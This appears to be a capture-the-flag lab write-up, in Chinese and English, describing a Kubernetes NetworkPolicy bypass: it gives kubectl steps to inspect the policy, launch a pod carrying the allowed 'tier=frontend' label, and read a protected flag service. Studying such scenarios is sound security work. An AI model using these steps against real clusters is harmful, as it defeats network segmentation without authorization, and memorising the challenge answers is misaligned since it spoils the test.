# K8S-27: NetworkPolicy Label Spoofing Bypass

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-27 |
| 名称 | NetworkPolicy Label Spoofing Bypass |
| 技术/CVE | N/A (network policy bypass) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：N/A (network policy bypass)
- 难度：L2
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE | N/A (network policy bypass via label manipulation) |
| Difficulty | L2 |
| Type | k8s |
| Cluster Name | cve-k8s-27-netpol-bypass |
| Attack Vector | NetworkPolicy uses pod labels → create pod with matching labels → bypass |

## Attack Path

```
Attacker pod blocked by NetworkPolicy (requires tier=frontend label)
  → Discover NetworkPolicy label requirement
  → Create new pod with tier=frontend label in isolated-ns
  → Access flag-service from bypass pod → Read flag
```

## Step-by-Step Exploitation

### Step 1: Test NetworkPolicy Blocking

```bash
kubectl exec -n attacker-ns attacker-pod -- wget -qO- --timeout=3 \
  http://flag-service.isolated-ns.svc.cluster.local:8080/flag
# Should FAIL — blocked by NetworkPolicy
```

### Step 2: Discover NetworkPolicy Rules

```bash
kubectl get networkpolicy -n isolated-ns protect-flag -o yaml
# Note: allows pods with label tier=frontend from any namespace
```

### Step 3: Bypass via Matching Pod

```bash
# Create a pod with the required label in the target namespace
kubectl run bypass-pod --image=alpine:latest -n isolated-ns \
  --labels='tier=frontend' -- sleep 3600

# Wait for pod to be ready
kubectl wait --for=condition=Ready pod/bypass-pod -n isolated-ns --timeout=30s
```

### Step 4: Access Flag Service from Bypass Pod

```bash
kubectl exec -n isolated-ns bypass-pod -- wget -qO- \
  http://flag-service.isolated-ns.svc.cluster.local:8080/flag
# Output: flag{k8s-27-<16-hex>}
```

### Alternative: Read Flag from Flag Pod Directly

```bash
FLAG_POD=$(kubectl get pods -n isolated-ns -l app=flag-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n isolated-ns $FLAG_POD -- cat /tmp/flag.txt
```

## Flag Location
- **Primary**: `/tmp/flag.txt` in `flag-service` pod in `isolated-ns`
- **Alternative**: HTTP endpoint `http://flag-service.isolated-ns:8080/flag`
- **Format**: `flag{k8s-27-<16-hex>}`

## Verification
```bash
cd cve_challenges/scenarios/k8s/networkpolicy-bypass && bash deploy.sh
kubectl exec -n isolated-ns -l app=flag-service -- cat /tmp/flag.txt
bash teardown.sh
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | NetworkPolicy selectors and Kubernetes labels |
| 侦察与前置条件 | Policy selector semantics and label mutation permissions |
| 核心漏洞与利用 | Spoof a label to satisfy NetworkPolicy selection |
| 权限、横向或影响 | Network segmentation bypass |
| 验证 | Reach the protected service and collect the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
